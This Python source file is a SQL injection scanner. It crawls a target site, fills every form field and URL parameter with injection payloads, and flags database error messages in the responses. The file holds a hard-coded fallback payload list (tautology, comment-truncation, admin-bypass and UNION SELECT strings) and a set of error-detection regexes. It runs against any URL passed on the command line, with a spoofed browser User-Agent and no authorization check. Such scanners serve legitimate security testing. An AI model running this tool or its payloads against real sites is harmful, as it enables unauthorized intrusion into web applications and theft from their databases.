#!/usr/bin/env python3
"""
SQL Injection Scanner Module
--------------------------
Scans for SQL Injection vulnerabilities in a web application.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re
from colorama import Fore, Style
import time
import random
import os

class SQLInjectionScanner:
    def __init__(self, target_url):
        """Initialize the SQL Injection scanner."""
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
        })
        self.forms = []
        self.links = []
        self.vulnerable_forms = []
        self.vulnerable_links = []
        
        # Load SQL injection payloads from wordlist
        self.payloads = self._load_payloads()
        
        # Error patterns to detect SQL injection
        self.error_patterns = [
            "SQL syntax.*MySQL", 
            "Warning.*mysql_.*", 
            "valid MySQL result", 
            "MySqlClient\.",
            "MySQL Query fail.*",
            "SQL syntax.*Oracle.*",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*oci_.*",
            "Microsoft OLE DB Provider for ODBC Drivers error",
            "ODBC SQL Server Driver",
            "ODBC Error",
            "Microsoft OLE DB Provider for SQL Server",
            "OLE DB.*SQL Server",
            "SQLServer JDBC Driver",
            "SQLState",
            "SQL Server.*Driver",
            "Unclosed quotation mark after the character string",
            "Microsoft Access Driver",
            "Microsoft JET Database Engine error",
            "Access Database Engine",
            "PostgreSQL.*ERROR",
            "Warning.*pg_.*",
            "valid PostgreSQL result",
            "Npgsql\.",
            "PG::SyntaxError:",
            "org\\.postgresql\\.util\\.PSQLException",
            "ERROR:.*syntax error at or near",
            "SQLite.*Error",
            "Warning.*sqlite_.*",
            "Warning.*SQLite3::",
            "SQLite/JDBCDriver",
            "System\\.Data\\.SQLite\\.SQLiteException:",
            "on MySQL result index",
            "Over 65000 rows were returned",
            "mysqli_fetch_array()",
            "mysql_fetch_array()",
            "mysql_num_rows()",
            "mysqli_num_rows()",
            "SQL command not properly ended",
            "Error Executing Database Query",
            "Unclosed quotation mark"
        ]
    
    def _load_payloads(self):
        """Load SQL injection payloads from wordlist file."""
        wordlist_path = "wordlists/sql_payloads.txt"
        
        if os.path.exists(wordlist_path):
            try:
                with open(wordlist_path, 'r') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"{Fore.GREEN}[+] Loaded {len(payloads)} SQL injection payloads from {wordlist_path}{Style.RESET_ALL}")
                return payloads
            except Exception as e:
                print(f"{Fore.RED}[!] Error loading SQL payloads from {wordlist_path}: {str(e)}{Style.RESET_ALL}")
        
        # Fallback to default payloads if file not found or error occurs
        print(f"{Fore.YELLOW}[!] Using default SQL injection payloads{Style.RESET_ALL}")
        return [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "' OR '1'='1' #", 
            "' OR '1'='1'/*", 
            "' OR 1=1--", 
            "' OR 1=1#", 
            "' OR 1=1/*", 
            "') OR ('1'='1", 
            "') OR ('1'='1' --", 
            "1' OR '1'='1", 
            "1' OR '1'='1' --",
            "admin' --",
            "admin' #",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --"
        ]
    
    def _extract_forms(self, url):
        """Extract all forms from a webpage."""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            return soup.find_all('form')
        except Exception as e:
            print(f"{Fore.RED}[!] Error extracting forms from {url}: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _extract_links(self, url):
        """Extract all links with parameters from a webpage."""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            links = []
            for a_tag in soup.find_all('a', href=True):
                href = a_tag.get('href')
                
                # Only consider links with parameters
                if '?' in href and '=' in href:
                    full_url = urljoin(url, href)
                    links.append(full_url)
            
            return links
        except Exception as e:
            print(f"{Fore.RED}[!] Error extracting links from {url}: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _is_vulnerable_to_sqli(self, response):
        """Check if a response indicates SQL injection vulnerability."""
        # Check for SQL errors in the response
        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True, pattern
        
        return False, None
    
    def _test_form(self, form, url):
        """Test a form for SQL injection vulnerabilities."""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        form_url = urljoin(url, action) if action else url
        
        # Collect form inputs
        inputs = {}
        for input_field in form.find_all(['input', 'textarea']):
            input_type = input_field.get('type', '').lower()
            input_name = input_field.get('name')
            
            # Skip submit/button inputs
            if input_type in ['submit', 'button', 'image', 'reset', 'file'] or not input_name:
                continue
            
            inputs[input_name] = input_field.get('value', '')
        
        if not inputs:
            return False, None
        
        # test each payload
        for payload in self.payloads:
            test_data = inputs.copy()
            
            # apply payload to each input
            for input_name in test_data:
                test_data[input_name] = payload
            
            try:
                # send request based on method
                if method == 'post':
                    response = self.session.post(form_url, data=test_data, timeout=10, allow_redirects=True)
                else:
                    response = self.session.get(form_url, params=test_data, timeout=10, allow_redirects=True)
                
                # Check if vulnerable
                is_vulnerable, pattern = self._is_vulnerable_to_sqli(response)
                if is_vulnerable:
                    return True, {
                        'url': form_url,
                        'method': method,
                        'inputs': list(inputs.keys()),
                        'payload': payload,
                        'error_pattern': pattern
                    }
                
                # wait a bit to avoid overwhelming the server
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                print(f"{Fore.RED}[!] Error testing form at {form_url}: {str(e)}{Style.RESET_ALL}")
        
        return False, None
    
    def _test_link(self, url):
        """Test a URL with parameters for SQL injection vulnerabilities."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return False, None
        
        base_url = parsed.scheme + '://' + parsed.netloc + parsed.path
        
        # test each payload
        for payload in self.payloads:
            for param in params:
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Reconstruct query string
                query_string = '&'.join(f"{p}={test_params[p][0]}" for p in test_params)
                test_url = f"{base_url}?{query_string}"
                
                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=True)
                    
                    # Check if vulnerable
                    is_vulnerable, pattern = self._is_vulnerable_to_sqli(response)
                    if is_vulnerable:
                        return True, {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'error_pattern': pattern
                        }
                    
                    # Wait a bit to avoid overwhelming the server
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    print(f"{Fore.RED}[!] Error testing link {test_url}: {str(e)}{Style.RESET_ALL}")
        
        return False, None
    
    def scan(self):
        """Run the SQL injection scanner."""
        print(f"{Fore.YELLOW}[*] Starting SQL Injection scan for {self.target_url}{Style.RESET_ALL}")
        
        # Extract forms and links
        print(f"{Fore.BLUE}[*] Extracting forms and links from the target...{Style.RESET_ALL}")
        self.forms = self._extract_forms(self.target_url)
        self.links = self._extract_links(self.target_url)
        
        print(f"{Fore.BLUE}[*] Found {len(self.forms)} forms and {len(self.links)} links with parameters{Style.RESET_ALL}")
        
        # Test forms
        if self.forms:
            print(f"{Fore.BLUE}[*] Testing forms for SQL injection vulnerabilities...{Style.RESET_ALL}")
            for i, form in enumerate(self.forms, start=1):
                print(f"{Fore.BLUE}[*] Testing form {i}/{len(self.forms)}{Style.RESET_ALL}")
                vulnerable, details = self._test_form(form, self.target_url)
                
                if vulnerable:
                    self.vulnerable_forms.append(details)
                    print(f"{Fore.RED}[!] SQL Injection vulnerability found in form:{Style.RESET_ALL}")
                    print(f"{Fore.RED}    URL: {details['url']}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    Method: {details['method']}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    Inputs: {', '.join(details['inputs'])}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    Payload: {details['payload']}{Style.RESET_ALL}")
        
        # Test links
        if self.links:
            print(f"{Fore.BLUE}[*] Testing links for SQL injection vulnerabilities...{Style.RESET_ALL}")
            for i, link in enumerate(self.links, start=1):
                print(f"{Fore.BLUE}[*] Testing link {i}/{len(self.links)}: {link}{Style.RESET_ALL}")
                vulnerable, details = self._test_link(link)
                
                if vulnerable:
                    self.vulnerable_links.append(details)
                    print(f"{Fore.RED}[!] SQL Injection vulnerability found in link:{Style.RESET_ALL}")
                    print(f"{Fore.RED}    URL: {details['url']}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    Parameter: {details['parameter']}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    Payload: {details['payload']}{Style.RESET_ALL}")
        
        total_vulnerabilities = len(self.vulnerable_forms) + len(self.vulnerable_links)
        print(f"{Fore.YELLOW}[*] SQL Injection scan completed. Found {total_vulnerabilities} vulnerabilities.{Style.RESET_ALL}")
        
        return {
            "target": self.target_url,
            "vulnerable_forms": self.vulnerable_forms,
            "vulnerable_links": self.vulnerable_links,
            "total_vulnerabilities": total_vulnerabilities
        }


if __name__ == "__main__":
    # For testing purposes
    import sys
    if len(sys.argv) != 2:
        print("Usage: python sql_injection_scanner.py <target_url>")
        sys.exit(1)
    
    scanner = SQLInjectionScanner(sys.argv[1])
    results = scanner.scan()
    
    print(f"Found {results['total_vulnerabilities']} SQL Injection vulnerabilities for {results['target']}")
